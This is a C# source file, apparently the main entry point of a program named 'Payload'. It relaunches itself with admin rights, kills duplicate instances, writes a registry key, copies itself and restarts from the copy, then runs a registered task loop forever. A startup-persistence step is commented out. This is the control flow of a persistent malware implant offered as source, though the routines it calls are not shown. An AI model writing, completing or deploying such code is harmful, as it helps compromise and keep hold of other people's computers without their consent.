using Payload.Common;
using Payload.Core.Command;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Principal;
using System.Security.AccessControl;
using System.IO;

namespace Payload
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Run();
            }
            catch(Exception e)
            {
                TextHelper.WriteError(e.Message);
                TextHelper.WriteError(e.StackTrace);
            }
        }
        static void OnRelease()
        {
            if (!Config.IsRelease())
                return;
            new RegistryKeyCommand().Execute();
            if (new CopyItselfCommand().Execute() == null)
                new StartProcessFactory().CreateCommand().Execute();
            else
            {
                new ClearOtherPatchCommand().Execute();
                //new StartupSetupCommand().Execute();
            }
        }

        
        static void Run()
        {
            new AdminRelauncher();
            new KillOtherMeCommand().Execute();
            OnRelease();
            new ConsoleLogCommand().Execute<String>($"Task Interval : {TextHelper.GenTimeSpanFromMillisec(Config.Instance.MainSleepInterval)}");
            Command.CommandManager.Instance.RegisterTask();

            while (true)
            {
                Command.CommandManager.Instance.Run();
                Thread.Sleep(Config.Instance.MainSleepInterval);
            }
        }
    }
}
